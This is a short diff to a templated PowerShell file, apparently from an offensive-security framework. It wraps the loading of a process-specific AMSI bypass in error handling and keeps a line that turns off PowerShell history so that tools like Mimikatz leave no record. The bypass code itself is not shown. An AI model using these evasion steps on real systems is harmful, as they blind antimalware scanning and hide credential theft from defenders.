@@ -1,7 +1,12 @@
 {#- At this point, we assume AMSI is disabled -#}
 {#- Load process-specific AMSI bypass -#}
 
+try {
 {%- include "powershell/amsi/process.ps1" %}
+{{'Write-Debug "Process specific AMSI Bypass successfully loaded"'|debug}}
+} catch {
+{{'Write-Debug "Process specific AMSI Bypass failed: $_"'|debug}}
+}
 
 {# Disable Readline Histfile; things like 'Invoke-Mimikatz' in it might trigger #}
 try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
